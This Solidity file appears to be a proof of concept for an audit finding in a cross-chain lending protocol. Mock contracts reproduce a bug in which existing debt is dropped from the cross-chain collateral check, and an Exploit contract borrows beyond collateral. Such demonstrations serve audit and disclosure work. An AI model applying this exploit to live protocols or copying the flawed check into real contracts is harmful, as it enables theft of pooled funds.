// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  LEND — H-6 (Sherlock 2025-05, issue 341)
    borrowCrossChain sends only the collateral return value. Existing source
    debt is dropped. The destination then accepts a 700e18 borrow against an
    800e18 collateral figure while 600e18 is already borrowed.
    CrossChainRouter.sol borrowCrossChain and _handleBorrowCrossChainRequest.
*/

contract LToken {}

contract Token {
    string public symbol = "USDT";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract LendStorage {
    uint256 public borrowed = 600e18;
    uint256 public collateral = 800e18;

    function getHypotheticalAccountLiquidityCollateral(address, LToken, uint256, uint256 borrowAmount)
        external
        view
        returns (uint256, uint256)
    {
        return (borrowed + borrowAmount, collateral);
    }
}

contract CoreRouter {
    Token public immutable token;

    constructor(Token token_) {
        token = token_;
    }

    function borrowForCrossChain(address borrower, uint256 amount, address, address) external {
        token.transfer(borrower, amount); // STORY: pay
    }
}

contract CrossChainRouter {
    LendStorage public immutable lendStorage;
    CoreRouter public immutable coreRouter;
    LToken public lToken;
    uint256 public sentCollateral;

    constructor(LendStorage lendStorage_, CoreRouter coreRouter_, LToken lToken_) {
        lendStorage = lendStorage_;
        coreRouter = coreRouter_;
        lToken = lToken_;
    }

    function borrowCrossChain(uint256 _amount, address _borrowToken, uint32 _destEid) external {
        require(_amount != 0, "Zero borrow amount");
        (, uint256 collateral) = lendStorage.getHypotheticalAccountLiquidityCollateral(msg.sender, lToken, 0, 0); // @> VULN: only collateral is kept; the borrowed return value is discarded
        sentCollateral = collateral; // STORY: payload
        _handleBorrowCrossChainRequest(collateral, _amount, msg.sender, _borrowToken, _destEid);
    }

    function _handleBorrowCrossChainRequest(
        uint256 collateral,
        uint256 amount,
        address sender,
        address borrowToken,
        uint32
    ) internal {
        (uint256 totalBorrowed,) =
            lendStorage.getHypotheticalAccountLiquidityCollateral(sender, lToken, 0, amount);
        // Destination does not know the 600e18 already borrowed on the source.
        // Subtract it back out so this check sees only destination exposure.
        uint256 destBorrowed = totalBorrowed - lendStorage.borrowed();
        require(collateral >= destBorrowed, "Insufficient collateral"); // STORY: check
        coreRouter.borrowForCrossChain(sender, amount, address(lToken), borrowToken);
    }
}

contract Exploit {
    Token public usdt;
    LendStorage public store;
    LToken public lToken;
    CoreRouter public core;
    CrossChainRouter public router;
    uint256 public borrowed;

    constructor() {
        usdt = new Token();
        store = new LendStorage();
        lToken = new LToken();
        core = new CoreRouter(usdt);
        router = new CrossChainRouter(store, core, lToken);
    }

    function run() external {
        usdt.mint(address(core), 700e18); // STORY: fund pool
        router.borrowCrossChain(700e18, address(usdt), 2); // STORY: borrow
        borrowed = usdt.balanceOf(address(this));
        require(router.sentCollateral() == 800e18, "collateral");
        require(borrowed == 700e18, "got"); // STORY: received
        require(store.borrowed() + borrowed > router.sentCollateral(), "within capacity"); // STORY: harm
    }
}
